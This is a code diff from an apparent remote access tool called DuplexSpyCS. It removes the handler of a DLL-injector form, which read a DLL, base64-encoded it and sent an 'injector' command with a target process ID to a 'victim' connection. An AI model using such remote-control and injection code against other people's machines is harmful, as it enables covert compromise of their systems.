@@ -34,10 +34,7 @@ namespace DuplexSpyCS
 
         private void fnSetup()
         {
-            textBox2.Text = m_nProcId.ToString();
-
-            textBox4.Text = "This method is used for native DLL injection only.";
-            textBox5.Text = "This method is used for C# DLL injection only.";
+            
         }
 
         private void frmTaskDLLInjector_Load(object sender, EventArgs e)
@@ -60,45 +57,7 @@ namespace DuplexSpyCS
         {
             try
             {
-                int nIdx = tabControl1.SelectedIndex;
-
-                string szFileName = textBox1.Text;
-                int nProcId = int.Parse(textBox2.Text);
-                List<string> lsArgs = textBox3.Text.Split(' ').ToList();
-
-                byte[] abBuffer = File.ReadAllBytes(szFileName);
-                Task.Run(() =>
-                {
-                    switch (nIdx)
-                    {
-                        case 0:
-                            m_victim.fnSendCommand(new string[]
-                            {
-                                "injector",
-                                nIdx.ToString(),
-                                Convert.ToBase64String(abBuffer),
-                                nProcId.ToString(),
-                            });
-                            break;
-                        case 1:
-                            m_victim.fnSendCommand(new string[]
-                            {
-                                "injector",
-                                nIdx.ToString(),
-                                Convert.ToBase64String(abBuffer),
-                                string.Join(",", lsArgs.Select(x => clsCrypto.b64E2Str(x))),
-                            });
-                            break;
-                        case 2:
-                            m_victim.fnSendCommand(new string[]
-                            {
-                                "injector",
-                                nIdx.ToString(),
-
-                            });
-                            break;
-                    }
-                });
+                
             }
             catch (Exception ex)
             {
